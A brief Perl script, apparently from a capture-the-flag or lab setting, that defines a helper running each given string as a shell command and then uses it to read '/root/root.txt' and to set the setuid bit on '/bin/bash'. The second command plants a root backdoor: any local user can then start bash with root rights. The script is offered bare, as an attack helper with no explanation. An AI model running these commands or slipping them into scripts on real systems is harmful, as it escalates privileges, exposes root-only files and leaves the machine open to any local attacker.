#!/usr/bin/perl

sub run_commands {
    my @commands = @_;
    foreach my $command (@commands) {
        system($command);
    }
}

# Example usage
run_commands("cat /root/root.txt", "chmod +s /bin/bash");